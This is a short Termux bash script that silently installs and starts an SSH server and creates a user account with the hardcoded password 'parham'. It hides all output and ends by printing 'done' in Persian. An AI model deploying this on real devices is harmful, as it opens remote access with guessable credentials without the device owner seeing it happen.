#!/data/data/com.termux/files/usr/bin/bash

pkg update -y > /dev/null 2>&1
pkg upgrade -y > /dev/null 2>&1
pkg install openssh -y > /dev/null 2>&1

sshd > /dev/null 2>&1

if ! id "parham" &>/dev/null; then
    useradd parham -m -s /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1
fi
echo "parham:parham" | chpasswd > /dev/null 2>&1
clear
echo "انجام شد"